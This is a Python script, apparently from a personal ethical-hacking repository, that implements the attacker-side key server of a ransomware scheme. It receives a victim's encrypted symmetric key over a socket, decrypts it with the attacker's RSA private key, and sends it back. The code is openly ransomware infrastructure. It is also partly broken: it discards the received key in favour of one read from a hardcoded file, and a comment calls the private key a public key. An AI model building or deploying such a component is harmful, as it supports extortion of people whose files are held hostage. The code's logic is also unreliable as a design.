#!/usr/bin/env python3

import socketserver
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

class ClientHandler(socketserver.BaseRequestHandler):

    def handle(self):
        clientEncryptedSymmetricKey = self.request.recv(1024).strip()
        # clientEncryptedSymmetricKey = self.request.recv(1024)
        
        print(f"Implement descryption of data: {clientEncryptedSymmetricKey}")

        hostPrivateKeyPath = '/home/bobby_vz/sandbox/openssltesting/private_key.pem' # <=== Hackers public key

        clientEncryptedSymmetricKeyPath = '/home/bobby_vz/git_repos/EthicalHacking/Ransomware/clientEncryptedSymmetricKey.key'

        with open(clientEncryptedSymmetricKeyPath, "rb") as private_enc:
            clientEncryptedSymmetricKey = private_enc.read()
            # print(f"clientEncryptedSymmetricKey FROM FILE: {clientEncryptedSymmetricKey}")
        
        
        
        # Load our host private key
        with open(hostPrivateKeyPath,"rb") as key_file:
            hostPrivate_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )


        # Decrypt client encrypted private key using hostPrivate_key and write to file

        client_private_key = hostPrivate_key.decrypt(
            clientEncryptedSymmetricKey,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print(f"client_private_key: {client_private_key}")


        print(f"Client private key... {client_private_key}\n\n")

        # client_private_key_encoded = str.encode(client_private_key)


        self.request.sendall(client_private_key)
        # self.request.sendall(client_private_key_encoded)
        # self.request.sendall("send key back")

if __name__ == "__main__" :
    # HOST, PORT = "", 8000
    HOST, PORT = "localhost", 5000

    # tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
    try:
        tcpServer.serve_forever()
    except:
        print("There was an error")

